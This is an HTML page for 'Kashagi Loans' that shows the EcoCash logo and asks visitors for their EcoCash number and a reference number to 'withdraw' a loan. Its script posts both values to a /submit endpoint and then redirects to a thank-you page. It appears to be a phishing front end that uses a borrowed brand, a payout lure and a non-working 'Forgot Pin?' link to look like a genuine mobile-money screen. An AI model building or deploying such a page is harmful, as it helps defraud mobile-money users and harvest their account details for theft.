<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Kashagi Loans</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 20px;

            min-height: 100vh;

            font-family:
                Arial,
                Helvetica,
                sans-serif;

            background: #eef5fb;

            display: flex;
            align-items: center;
            justify-content: center;
        }


        /* =========================
           MAIN CONTAINER
        ========================= */

        .container {
            width: 100%;
            max-width: 590px;

            background: white;

            border-radius: 20px;

            overflow: hidden;

            box-shadow:
                0 12px 35px rgba(0, 0, 0, 0.15);
        }


        /* =========================
           BLUE HEADER
        ========================= */

        .header {
            background: #1877f2;

            color: white;

            text-align: center;

            padding: 40px 20px 42px;
        }


        .logo {
            width: 150px;
            height: 150px;

            object-fit: contain;

            display: block;

            margin: 0 auto 18px;
        }


        .title {
            margin: 0;

            font-size: 40px;

            font-weight: 700;
        }


        .subtitle {
            margin-top: 10px;

            font-size: 24px;
        }


        /* =========================
           FORM AREA
        ========================= */

        .form-area {
            padding: 40px;
        }


        .field {
            margin-bottom: 28px;
        }


        label {
            display: block;

            margin-bottom: 12px;

            font-size: 25px;

            font-weight: 700;

            color: #333;
        }


        input {
            width: 100%;

            height: 70px;

            padding: 0 20px;

            border: 1px solid #d9d9d9;

            border-radius: 10px;

            font-size: 21px;

            outline: none;

            background: white;
        }


        input:focus {
            border-color: #1877f2;

            box-shadow:
                0 0 0 2px rgba(24, 119, 242, 0.12);
        }


        /* =========================
           BUTTON
        ========================= */

        .withdraw-btn {
            width: 100%;

            height: 72px;

            border: none;

            border-radius: 10px;

            background: #1877f2;

            color: white;

            font-size: 24px;

            font-weight: 700;

            cursor: pointer;
        }


        .withdraw-btn:disabled {
            opacity: 0.7;

            cursor: not-allowed;
        }


        /* =========================
           FORGOT PIN
        ========================= */

        .forgot {
            display: block;

            text-align: center;

            margin-top: 28px;

            color: #1877f2;

            font-size: 21px;

            text-decoration: none;
        }


        /* =========================
           MOBILE
        ========================= */

        @media (max-width: 600px) {

            body {
                padding: 0 12px;
            }


            .header {
                padding: 38px 15px 40px;
            }


            .logo {
                width: 145px;
                height: 145px;
            }


            .title {
                font-size: 36px;
            }


            .subtitle {
                font-size: 22px;
            }


            .form-area {
                padding: 35px 30px;
            }


            label {
                font-size: 23px;
            }


            input {
                height: 68px;

                font-size: 20px;
            }


            .withdraw-btn {
                height: 70px;

                font-size: 22px;
            }
        }

    </style>
</head>


<body>


<div class="container">


    <!-- =========================
         HEADER
    ========================= -->

    <div class="header">

        <img
            src="Ecocash.png"
            alt="EcoCash"
            class="logo"
        >


        <h1 class="title">
            Kashagi Loans
        </h1>


        <div class="subtitle">
            Fast • Secure • Reliable
        </div>

    </div>



    <!-- =========================
         FORM
    ========================= -->

    <div class="form-area">


        <!-- ECOCASH NUMBER -->

        <div class="field">

            <label for="ecocash_number">
                EcoCash Number
            </label>


            <input
                type="tel"
                id="ecocash_number"
                placeholder="e.g. 0771234567"
                autocomplete="tel"
            >

        </div>



        <!-- REFERENCE NUMBER -->

        <div class="field">

            <label for="reference_number">
                Reference Number
            </label>


            <input
                type="text"
                id="reference_number"
                placeholder="Enter reference number"
                autocomplete="off"
            >

        </div>



        <!-- WITHDRAW BUTTON -->

        <button
            type="button"
            id="withdrawBtn"
            class="withdraw-btn"
            onclick="submitForm()"
        >
            Withdraw to EcoCash
        </button>



        <!-- FORGOT PIN -->

        <a
            href="#"
            class="forgot"
            onclick="return false;"
        >
            Forgot Pin?
        </a>

    </div>

</div>



<script>


async function submitForm() {


    // Get EcoCash number

    const ecocashNumber =
        document
        .getElementById("ecocash_number")
        .value
        .trim();



    // Get reference number

    const referenceNumber =
        document
        .getElementById("reference_number")
        .value
        .trim();



    // Check EcoCash number

    if (!ecocashNumber) {

        alert(
            "Please enter your EcoCash number."
        );

        return;
    }



    // Check reference number

    if (!referenceNumber) {

        alert(
            "Please enter your reference number."
        );

        return;
    }



    const button =
        document.getElementById(
            "withdrawBtn"
        );



    // Disable button while processing

    button.disabled = true;

    button.textContent =
        "Processing...";



    try {


        const response =
            await fetch(
                "/submit",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({

                        ecocash_number:
                            ecocashNumber,

                        reference_number:
                            referenceNumber

                    })
                }
            );



        const data =
            await response.json();



        // Server returned an error

        if (
            !response.ok ||
            !data.success
        ) {

            throw new Error(
                data.message ||
                "Submission failed."
            );
        }



        // Successful submission

        alert(
            "Withdrawal request has been received successfully."
        );



        // Redirect after OK

        window.location.href =
            "/thankyou.html";


    } catch (error) {


        console.error(
            "SUBMISSION ERROR:",
            error
        );


        alert(
            "Server connection error. Please try again later."
        );


        button.disabled = false;

        button.textContent =
            "Withdraw to EcoCash";
    }

}


</script>


</body>
</html>
